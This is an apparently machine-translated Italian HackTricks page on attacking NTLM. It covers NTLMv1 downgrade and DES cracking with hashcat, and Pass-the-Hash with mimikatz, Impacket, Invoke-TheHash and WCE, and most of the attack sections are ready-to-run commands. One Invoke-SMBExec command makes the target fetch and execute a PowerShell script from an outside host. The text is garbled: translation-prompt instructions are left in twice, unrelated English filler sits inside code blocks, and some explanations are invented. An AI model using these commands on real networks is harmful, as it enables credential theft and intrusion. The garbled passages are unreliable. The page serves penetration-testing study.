# NTLM

## NTLM

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Informazioni di base

Negli ambienti in cui sono in uso **Windows XP e Server 2003**, vengono utilizzati gli hash LM (Lan Manager), anche se è ampiamente riconosciuto che questi possono essere facilmente compromessi. Un particolare hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non viene utilizzato, rappresentando l'hash per una stringa vuota.

Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in determinate circostanze: assenza di Active Directory, mancanza del dominio, malfunzionamento di Kerberos a causa di una configurazione errata o quando le connessioni vengono tentate utilizzando un indirizzo IP anziché un nome host valido.

La presenza dell'intestazione **"NTLMSSP"** nei pacchetti di rete indica un processo di autenticazione NTLM.

Il supporto per i protocolli di autenticazione - LM, NTLMv1 e NTLMv2 - è facilitato da una specifica DLL situata in `%windir%\Windows\System32\msv1\_0.dll`.

**Punti chiave**:

* Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) indica la sua non utilizzo.
* Kerberos è il metodo di autenticazione predefinito, con NTLM utilizzato solo in determinate condizioni.
* I pacchetti di autenticazione NTLM sono identificabili dall'intestazione "NTLMSSP".
* I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.

### LM, NTLMv1 e NTLMv2

È possibile verificare e configurare quale protocollo verrà utilizzato:

#### GUI

Esegui _secpol.msc_ -> Politiche locali -> Opzioni di sicurezza -> Sicurezza di rete: livello di autenticazione LAN Manager. Ci sono 6 livelli (da 0 a 5).

![](<../../.gitbook/assets/image (92).png>)

#### Registro

Questo imposterà il livello 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Possibili valori:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

### Schema di autenticazione di base NTLM del dominio

1. L'**utente** inserisce le sue **credenziali**
2. La macchina client **invia una richiesta di autenticazione** inviando il **nome del dominio** e il **nome utente**
3. Il **server** invia la **sfida**
4. Il client **cripta** la **sfida** utilizzando l'hash della password come chiave e la invia come risposta
5. Il **server invia** al **controller di dominio** il **nome del dominio, il nome utente, la sfida e la risposta**. Se non è configurato un Active Directory o il nome del dominio è il nome del server, le credenziali vengono **verificate localmente**.
6. Il **controller di dominio verifica se tutto è corretto** e invia le informazioni al server

Il **server** e il **controller di dominio** sono in grado di creare un **canale sicuro** tramite il server **Netlogon** poiché il controller di dominio conosce la password del server (è presente nel database **NTDS.DIT**).

#### Schema di autenticazione NTLM locale

L'autenticazione è come quella menzionata **precedentemente ma** il **server** conosce l'**hash dell'utente** che cerca di autenticarsi all'interno del file **SAM**. Quindi, anziché chiedere al controller di dominio, il **server verificherà se stesso** se l'utente può autenticarsi.

#### Sfida NTLMv1

La **lunghezza della sfida è di 8 byte** e la **risposta è lunga 24 byte**.

L'**hash NT (16 byte)** è diviso in **3 parti di 7 byte ciascuna** (7B + 7B + (2B+0x00\*5)): l'**ultima parte è riempita con zeri**. Quindi, la **sfida** viene **cifrata separatamente** con ogni parte e i byte cifrati risultanti vengono **uniti**. Totale: 8B + 8B + 8B = 24 byte.

**Problemi**:

* Mancanza di **casualità**
* Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
* **DES è vulnerabile** all'attacco
* La terza chiave è composta sempre da **5 zeri**
* Dato lo stesso sfida, la risposta sarà la **stessa**. Quindi, puoi fornire come **sfida** alla vittima la stringa "**1122334455667788**" e attaccare la risposta utilizzando **tabelle arcobaleno precalcolate**.

#### Attacco NTLMv1

Oggi è sempre meno comune trovare ambienti con la configurazione di Delega non vincolata, ma ciò non significa che non puoi **abusare di un servizio Print Spooler** configurato.

Potresti abusare di alcune credenziali/sessioni che hai già nell'AD per **chiedere alla stampante di autenticarsi** contro un **host sotto il tuo controllo**. Successivamente, utilizzando `metasploit auxiliary/server/capture/smb` o `responder`, puoi **impostare la sfida di autenticazione su 1122334455667788**, catturare il tentativo di autenticazione e, se è stato effettuato utilizzando **NTLMv1**, sarai in grado di **violare la sicurezza**.\
Se stai utilizzando `responder`, puoi provare ad **usare l'opzione `--lm`** per cercare di **degradare** l'**autenticazione**.\
Nota che per questa tecnica l'autenticazione deve essere effettuata utilizzando NTLMv1 (NTLMv2 non è valido).

Ricorda che la stampante utilizzerà l'account del computer durante l'autenticazione e gli account del computer utilizzano **password lunghe e casuali** che probabilmente non sarai in grado di violare utilizzando dizionari comuni. Ma l'autenticazione **NTLMv1** utilizza DES ([ulteriori informazioni qui](./#sfida-ntlmv1)), quindi utilizzando alcuni servizi appositamente dedicati alla violazione di DES sarai in grado di violarla (ad esempio, potresti utilizzare [https://crack.sh/](https://crack.sh)).

#### Attacco NTLMv1 con hashcat

NTLMv1 può essere violato anche con lo strumento NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), che formatta i messaggi NTLMv1 in un metodo che può essere violato con hashcat.

Il comando

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

Il seguente è il contenuto di un libro di hacking sulle tecniche di hacking. Il seguente contenuto proviene dal file /hive/hacktricks/windows-hardening/ntlm/README.md. Traduci il testo in inglese pertinente in italiano e restituisci la traduzione mantenendo esattamente la stessa sintassi markdown e html. Non tradurre cose come codice, nomi di tecniche di hacking, parole di hacking, nomi di piattaforme cloud/SaaS (come Workspace, aws, gcp...), la parola 'leak', pentesting e tag markdown. Inoltre, non aggiungere nulla di extra oltre alla traduzione e alla sintassi markdown.

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

## NTLM

### Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

### NTLM Authentication Process

The NTLM authentication process involves the following steps:

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response and grants access if it is valid.

### NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: Attackers can use the captured password hash to authenticate themselves without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: Attackers can use the captured Kerberos ticket to authenticate themselves without knowing the user's password.
3. **NTLM Relay Attack**: Attackers can relay authentication requests to other servers, gaining unauthorized access.
4. **NTLM Downgrade Attack**: Attackers can force the use of weaker NTLM versions, making it easier to crack the password hash.

### Mitigating NTLM Vulnerabilities

To mitigate NTLM vulnerabilities, you can take the following steps:

1. **Disable NTLM**: Disable NTLM authentication if not required.
2. **Enable SMB Signing**: Enable SMB signing to prevent NTLM relay attacks.
3. **Use Strong Passwords**: Enforce the use of strong passwords to make it harder to crack the password hash.
4. **Enable Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security.

### Conclusion

NTLM is a widely used authentication protocol in Windows environments. However, it has several vulnerabilities that can be exploited by attackers. By following the recommended mitigation steps, you can enhance the security of your Windows systems.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Esegui hashcat (la distribuzione è migliore tramite uno strumento come hashtopolis) poiché altrimenti ci vorranno diversi giorni.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

In questo caso conosciamo la password, che è password, quindi faremo un trucco a scopo dimostrativo:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Dobbiamo ora utilizzare le utility di hashcat per convertire le chiavi DES craccate in parti dell'hash NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

## NTLM

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for authentication purposes.

### NTLM Authentication Process

The NTLM authentication process involves the following steps:

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it and comparing it with the expected value.
5. If the response is valid, the server grants access to the client.

### NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access.
4. **NTLM Downgrade Attack**: An attacker forces the use of weaker NTLM versions, making it easier to crack the password hash.

### Mitigating NTLM Vulnerabilities

To mitigate NTLM vulnerabilities, you can take the following measures:

1. **Disable NTLM**: Disable NTLM authentication and use more secure authentication protocols like Kerberos.
2. **Enforce Strong Password Policies**: Implement strong password policies to make it harder for attackers to crack password hashes.
3. **Enable SMB Signing**: Enable SMB signing to prevent NTLM relay attacks.
4. **Enable Extended Protection for Authentication**: Enable Extended Protection for Authentication to protect against NTLM downgrade attacks.

### Conclusion

NTLM is a widely used authentication protocol in Windows environments, but it has several vulnerabilities that can be exploited by attackers. By understanding these vulnerabilities and implementing the necessary mitigations, you can enhance the security of your Windows systems.

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Il seguente è il contenuto di un libro di hacking sulle tecniche di hacking. Il seguente contenuto proviene dal file /hive/hacktricks/windows-hardening/ntlm/README.md. Traduci il testo inglese pertinente in italiano e restituisci la traduzione mantenendo esattamente la stessa sintassi markdown e html. Non tradurre cose come codice, nomi di tecniche di hacking, parole di hacking, nomi di piattaforme cloud/SaaS (come Workspace, aws, gcp...), la parola 'leak', pentesting e tag markdown. Inoltre, non aggiungere nulla di extra oltre alla traduzione e alla sintassi markdown.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

#### Sfida NTLMv2

La lunghezza della sfida è di 8 byte e vengono inviate 2 risposte: una è lunga 24 byte e la lunghezza dell'altra è variabile.

La prima risposta viene creata cifrando utilizzando HMAC\_MD5 la stringa composta dal client e dal dominio e utilizzando come chiave l'hash MD4 dell'NT hash. Successivamente, il risultato verrà utilizzato come chiave per cifrare utilizzando HMAC\_MD5 la sfida. A questo verrà aggiunto un client challenge di 8 byte. Totale: 24 B.

La seconda risposta viene creata utilizzando diversi valori (un nuovo client challenge, un timestamp per evitare attacchi di ripetizione...).

Se hai un pcap che ha catturato un processo di autenticazione riuscito, puoi seguire questa guida per ottenere il dominio, il nome utente, la sfida e la risposta e provare a craccare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

### Pass-the-Hash

Una volta ottenuto l'hash della vittima, puoi usarlo per impersonarla.\
Devi utilizzare uno strumento che eseguirà l'autenticazione NTLM utilizzando quel hash, oppure puoi creare un nuovo sessionlogon e iniettare quel hash all'interno di LSASS, in modo che quando viene eseguita qualsiasi autenticazione NTLM, verrà utilizzato quel hash. L'ultima opzione è ciò che fa mimikatz.

Per favore, ricorda che puoi eseguire attacchi Pass-the-Hash anche utilizzando gli account del computer.

#### Mimikatz

Deve essere eseguito come amministratore

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Questo avvierà un processo che apparterrà agli utenti che hanno avviato mimikatz, ma internamente in LSASS le credenziali salvate sono quelle all'interno dei parametri di mimikatz. Quindi, è possibile accedere alle risorse di rete come se si fosse quell'utente (simile al trucco `runas /netonly`, ma non è necessario conoscere la password in testo normale).

#### Pass-the-Hash da Linux

È possibile ottenere l'esecuzione del codice nelle macchine Windows utilizzando Pass-the-Hash da Linux.\
[**Accedi qui per saperne di più su come farlo.**](https://github.com/carlospolop/hacktricks/blob/it/windows/ntlm/broken-reference/README.md)

#### Strumenti compilati per Windows di Impacket

È possibile scaricare i binari di impacket per Windows qui: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In questo caso è necessario specificare un comando, cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Ci sono molti altri binari di Impacket...

#### Invoke-TheHash

È possibile ottenere gli script di PowerShell da qui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Invoke-SMBExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-WMIExec**

Invoke-WMIExec è uno script PowerShell che sfrutta il protocollo WMI (Windows Management Instrumentation) per eseguire comandi in remoto su un sistema Windows. Questo script può essere utilizzato per eseguire comandi come amministratore su un sistema remoto senza richiedere l'autenticazione dell'utente.

**Utilizzo**

Per utilizzare Invoke-WMIExec, è necessario eseguire il seguente comando:

```powershell
Invoke-WMIExec -Target <IP> -Username <Username> -Password <Password> -Command <Command>
```

Dove:

* `<IP>` è l'indirizzo IP del sistema di destinazione
* `<Username>` è il nome utente per l'autenticazione
* `<Password>` è la password per l'autenticazione
* `<Command>` è il comando da eseguire sul sistema di destinazione

**Esempio**

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

Questo esempio eseguirà il comando "net user" sul sistema con indirizzo IP 192.168.1.100 utilizzando le credenziali dell'amministratore.

**Avvertenza**

L'utilizzo di Invoke-WMIExec può essere considerato un'attività di hacking e può essere illegale senza il consenso del proprietario del sistema di destinazione. Assicurarsi di ottenere l'autorizzazione appropriata prima di utilizzare questo script.

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-SMBClient**

Il comando `Invoke-SMBClient` è un modulo di PowerShell che consente di interagire con il protocollo SMB (Server Message Block) per eseguire operazioni come la connessione a condivisioni di rete, l'elenco dei file e delle cartelle, il download e l'upload di file, nonché l'esecuzione di comandi remoti su un sistema Windows.

Questo modulo può essere utilizzato per scopi legittimi come il test di sicurezza e la risoluzione dei problemi di rete, ma può anche essere utilizzato in modo malevolo per eseguire attacchi di hacking come il furto di credenziali, l'esecuzione di comandi dannosi o il trasferimento di malware.

È importante utilizzare questo modulo con cautela e solo con l'autorizzazione del proprietario del sistema o della rete. L'abuso di questo modulo può comportare conseguenze legali.

Esempio di utilizzo:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share C$ -Username Administrator -Password P@ssw0rd -Command "dir"
```

Questo esempio si connette al sistema con indirizzo IP `192.168.1.100` utilizzando l'account `Administrator` e la password `P@ssw0rd`. Successivamente, esegue il comando `dir` per elencare i file e le cartelle nella condivisione `C$`.

Si prega di utilizzare questo modulo con responsabilità e solo per scopi legittimi.

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

**Invoke-SMBEnum**

Il comando `Invoke-SMBEnum` è uno strumento di hacking che può essere utilizzato per eseguire una scansione delle informazioni SMB (Server Message Block) su un sistema Windows. Questo comando può essere utile durante un test di penetrazione per identificare le condivisioni SMB, gli utenti e i gruppi, nonché le politiche di sicurezza SMB configurate sul sistema di destinazione.

Per utilizzare `Invoke-SMBEnum`, è necessario eseguire il comando da un prompt dei comandi PowerShell con privilegi elevati. Una volta eseguito, il comando eseguirà una scansione delle informazioni SMB e restituirà i risultati in un formato leggibile.

Ecco un esempio di come utilizzare `Invoke-SMBEnum`:

```powershell
Invoke-SMBEnum -Target 192.168.1.100
```

Questo comando eseguirà una scansione delle informazioni SMB sul sistema con indirizzo IP 192.168.1.100 e restituirà i risultati.

È importante notare che l'utilizzo di `Invoke-SMBEnum` per scopi non autorizzati è illegale e può comportare conseguenze legali. Assicurarsi di utilizzare questo strumento solo su sistemi per i quali si ha l'autorizzazione appropriata.

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

**Invoke-TheHash**

Questa funzione è una **combinazione di tutte le altre**. Puoi passare **diversi host**, **escludere** alcuni e **selezionare** l'**opzione** che desideri utilizzare (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se selezioni **qualunque** tra **SMBExec** e **WMIExec** ma **non** fornisci alcun parametro _**Command**_, verrà semplicemente **verificato** se hai **abbastanza permessi**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

#### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

#### Windows Credentials Editor (WCE)

**Deve essere eseguito come amministratore**

Questo strumento farà la stessa cosa di mimikatz (modificare la memoria di LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

#### Esecuzione remota manuale di Windows con nome utente e password

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

### Estrazione delle credenziali da un host Windows

**Per ulteriori informazioni su** [**come ottenere le credenziali da un host Windows, è necessario leggere questa pagina**](https://github.com/carlospolop/hacktricks/blob/it/windows-hardening/ntlm/broken-reference/README.md)**.**

### NTLM Relay e Responder

**Leggi una guida più dettagliata su come eseguire questi attacchi qui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Analisi delle sfide NTLM da una cattura di rete

**Puoi utilizzare** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
